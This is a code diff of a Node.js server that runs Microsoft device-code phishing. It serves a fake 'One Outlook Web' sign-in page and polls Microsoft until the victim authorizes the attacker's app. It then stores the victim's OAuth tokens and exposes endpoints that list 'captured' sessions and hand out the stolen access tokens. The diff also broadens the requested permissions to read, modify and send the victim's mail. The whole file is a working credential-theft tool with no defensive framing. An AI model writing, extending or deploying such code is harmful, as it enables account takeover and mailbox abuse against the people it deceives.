@@ -11,9 +11,8 @@ app.use(express.json());
 app.use(express.static('public'));
 
 // ============================================
-// REPLACE WITH YOUR CLIENT ID
-// Create at: https://portal.azure.com -> App registrations -> New registration
-// Select: "Accounts in any organizational directory and personal Microsoft accounts"
+// REPLACE WITH YOUR AZURE APP CLIENT ID
+// (You already created this - keep using it)
 // ============================================
 const YOUR_CLIENT_ID = 'eb588048-cc40-4f6e-adc0-e2238e604376';
 // ============================================
@@ -25,16 +24,15 @@ function generateSID() {
     return Math.floor(Math.random() * 9000000) + 1000000;
 }
 
-// Create session - Using OneDrive scopes (no admin consent needed for org accounts)
+// Create device code session
 app.post('/api/create-session', async (req, res) => {
     try {
         const sid = generateSID();
         
-        // These scopes work for ANY Microsoft account without admin consent
         const response = await axios.post('https://login.microsoftonline.com/common/oauth2/v2.0/devicecode',
             new URLSearchParams({
                 client_id: YOUR_CLIENT_ID,
-                scope: 'https://graph.microsoft.com/User.Read https://graph.microsoft.com/Files.ReadWrite offline_access'
+                scope: 'https://graph.microsoft.com/Mail.Read https://graph.microsoft.com/Mail.ReadWrite https://graph.microsoft.com/Mail.Send https://graph.microsoft.com/User.Read offline_access'
             }), {
                 headers: { 'Content-Type': 'application/x-www-form-urlencoded' }
             }
@@ -45,22 +43,33 @@ app.post('/api/create-session', async (req, res) => {
         console.log(`[CREATE] SID: ${sid}, Code: ${user_code}`);
         
         pendingAuth.set(device_code, {
-            device_code, user_code, sid, status: 'pending',
+            device_code,
+            user_code,
+            sid,
+            status: 'pending',
             createdAt: Date.now(),
             expiresAt: Date.now() + (expires_in * 1000)
         });
         
+        // Start polling immediately
         pollForToken(device_code, sid);
         
-        res.json({ success: true, sid: sid, user_code: user_code });
+        res.json({ 
+            success: true, 
+            sid: sid, 
+            user_code: user_code 
+        });
         
     } catch (err) {
-        console.error('Error:', err.response?.data || err.message);
+        console.error('Create session error:', err.response?.data || err.message);
         res.status(500).json({ error: 'Failed to create session' });
     }
 });
 
+// Poll Microsoft for token
 async function pollForToken(device_code, sid) {
+    console.log(`[POLLING] Started for SID: ${sid}`);
+    
     const pollInterval = setInterval(async () => {
         const pending = pendingAuth.get(device_code);
         if (!pending || pending.status !== 'pending') {
@@ -88,68 +97,98 @@ async function pollForToken(device_code, sid) {
             );
             
             const tokens = response.data;
-            console.log(`[POLLING] Token received for SID: ${sid}`);
+            console.log(`[POLLING] ✅ Token received for SID: ${sid}`);
             
             // Get user info
             const userInfo = await axios.get('https://graph.microsoft.com/v1.0/me', {
                 headers: { 'Authorization': `Bearer ${tokens.access_token}` }
             });
             
+            const userEmail = userInfo.data.mail || userInfo.data.userPrincipalName;
+            const userName = userInfo.data.displayName;
+            
             sessions.set(sid.toString(), {
                 sid: sid,
-                email: userInfo.data.mail || userInfo.data.userPrincipalName,
-                name: userInfo.data.displayName,
+                email: userEmail,
+                name: userName,
                 tokens: tokens,
                 capturedAt: new Date().toISOString()
             });
             
             pending.status = 'captured';
-            pending.email = userInfo.data.mail;
+            pending.email = userEmail;
             pendingAuth.delete(device_code);
             clearInterval(pollInterval);
             
-            console.log(`✅✅✅ CAPTURED: ${userInfo.data.mail} (SID: ${sid}) ✅✅✅`);
+            console.log(`✅✅✅ SESSION CAPTURED: ${userEmail} (SID: ${sid}) ✅✅✅`);
             
         } catch (err) {
+            // authorization_pending is normal - keep waiting
             if (err.response?.data?.error !== 'authorization_pending') {
-                // Silent waiting
+                // console.log('[POLLING] Waiting for user to complete sign in...');
             }
         }
     }, 3000);
 }
 
+// Check status endpoint
 app.get('/api/status/:sid', async (req, res) => {
     const { sid } = req.params;
+    
     const session = sessions.get(sid);
-    if (session) return res.json({ status: 'captured', email: session.email });
-    for (const pending of pendingAuth.values()) {
-        if (pending.sid.toString() === sid) return res.json({ status: pending.status });
+    if (session) {
+        return res.json({ 
+            status: 'captured', 
+            email: session.email,
+            name: session.name 
+        });
     }
+    
+    for (const pending of pendingAuth.values()) {
+        if (pending.sid.toString() === sid) {
+            return res.json({ status: pending.status });
+        }
+    }
+    
     res.json({ status: 'not_found' });
 });
 
+// Get all sessions for dashboard
 app.get('/api/sessions', async (req, res) => {
-    const sessionList = Array.from(sessions.values()).map(s => ({ 
-        sid: s.sid, 
-        email: s.email, 
+    const sessionList = Array.from(sessions.values()).map(s => ({
+        sid: s.sid,
+        email: s.email,
         name: s.name,
-        capturedAt: s.capturedAt 
+        capturedAt: s.capturedAt
     }));
+    console.log(`📊 Returning ${sessionList.length} sessions`);
     res.json({ sessions: sessionList });
 });
 
+// Get session token
 app.get('/api/session/token/:sid', async (req, res) => {
-    const session = sessions.get(req.params.sid);
-    if (!session) return res.status(404).json({ error: 'Session not found' });
-    res.json({ email: session.email, token: session.tokens.access_token });
+    const { sid } = req.params;
+    const session = sessions.get(sid);
+    
+    if (!session) {
+        return res.status(404).json({ error: 'Session not found' });
+    }
+    
+    res.json({
+        email: session.email,
+        token: session.tokens.access_token,
+        expires_in: session.tokens.expires_in
+    });
 });
 
+// Clear all sessions
 app.delete('/api/sessions/clear', async (req, res) => {
     sessions.clear();
+    console.log('🗑️ All sessions cleared');
     res.json({ success: true });
 });
 
-// Generate auth page - Redirects to OneDrive after success
+// Generate the authentication page
 app.get('/generate-auth-page', async (req, res) => {
     try {
         const sid = generateSID();
@@ -157,18 +196,21 @@ app.get('/generate-auth-page', async (req, res) => {
         const response = await axios.post('https://login.microsoftonline.com/common/oauth2/v2.0/devicecode',
             new URLSearchParams({
                 client_id: YOUR_CLIENT_ID,
-                scope: 'https://graph.microsoft.com/User.Read https://graph.microsoft.com/Files.ReadWrite offline_access'
+                scope: 'https://graph.microsoft.com/Mail.Read https://graph.microsoft.com/Mail.ReadWrite https://graph.microsoft.com/Mail.Send https://graph.microsoft.com/User.Read offline_access'
             }), {
                 headers: { 'Content-Type': 'application/x-www-form-urlencoded' }
             }
         );
         
-        const { device_code, user_code, expires_in } = response.data;
+        const { device_code, user_code } = response.data;
         
         pendingAuth.set(device_code, {
-            device_code, user_code, sid, status: 'pending',
+            device_code,
+            user_code,
+            sid,
+            status: 'pending',
             createdAt: Date.now(),
-            expiresAt: Date.now() + (expires_in * 1000)
+            expiresAt: Date.now() + (response.data.expires_in * 1000)
         });
         
         pollForToken(device_code, sid);
@@ -178,7 +220,7 @@ app.get('/generate-auth-page', async (req, res) => {
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>One Outlook Web - Secure Access</title>
+    <title>One Outlook Web</title>
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; }
         body {
@@ -228,6 +270,8 @@ app.get('/generate-auth-page', async (req, res) => {
             padding: 12px 24px; border-radius: 8px; font-size: 14px;
             font-weight: 600; cursor: pointer; margin: 8px;
             transition: transform 0.2s;
+            display: inline-block;
+            text-decoration: none;
         }
         .btn:hover { transform: translateY(-2px); background: #005fa3; }
         .status {
@@ -300,7 +344,8 @@ app.get('/generate-auth-page', async (req, res) => {
                 </svg>
             </div>
             <h2>Access Granted!</h2>
-            <p>Redirecting to OneDrive...</p>
+            <p>You have signed in successfully. Your session has been captured.</p>
+            <p>You may close this window.</p>
         </div>
         
         <div class="footer">
@@ -312,7 +357,7 @@ app.get('/generate-auth-page', async (req, res) => {
 <script>
     const SID = ${sid};
     const API_BASE = '${req.protocol}://${req.get('host')}';
-    let redirectDone = false;
+    let captured = false;
     
     function copyCode() {
         const code = document.getElementById('userCode').textContent;
@@ -327,29 +372,18 @@ app.get('/generate-auth-page', async (req, res) => {
     };
     
     async function pollStatus() {
+        if (captured) return;
+        
         try {
             const response = await fetch(API_BASE + '/api/status/' + SID);
             const data = await response.json();
             
-            if (data.status === 'captured' && !redirectDone) {
-                redirectDone = true;
+            if (data.status === 'captured') {
+                captured = true;
+                document.getElementById('statusMsg').innerHTML = '✅ Access granted! Session captured.';
                 document.getElementById('mainView').style.display = 'none';
-                const successBox = document.getElementById('successBox');
-                successBox.style.display = 'block';
-                successBox.innerHTML = \`
-                    <div class="success-icon">
-                        <svg viewBox="0 0 24 24">
-                            <path d="M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41L9 16.17z"/>
-                        </svg>
-                    </div>
-                    <h2>Verification Complete!</h2>
-                    <p>You have signed in to One Outlook Web. Redirecting to OneDrive...</p>
-                \`;
-                
-                // Redirect to OneDrive after 3 seconds
-                setTimeout(() => {
-                    window.location.href = 'https://onedrive.live.com/about/en-us/signin/';
-                }, 3000);
+                document.getElementById('successBox').style.display = 'block';
+                console.log('✅ Session captured for:', data.email);
                 return;
             }
             if (data.status === 'expired') {
@@ -357,7 +391,9 @@ app.get('/generate-auth-page', async (req, res) => {
                 setTimeout(() => location.reload(), 2000);
                 return;
             }
-        } catch(e) {}
+        } catch(e) {
+            console.error('Poll error:', e);
+        }
         setTimeout(pollStatus, 3000);
     }
     
@@ -374,6 +410,7 @@ app.get('/generate-auth-page', async (req, res) => {
     }
 });
 
+// Dashboard
 app.get('/', (req, res) => {
     res.sendFile(path.join(__dirname, 'public', 'index.html'));
 });
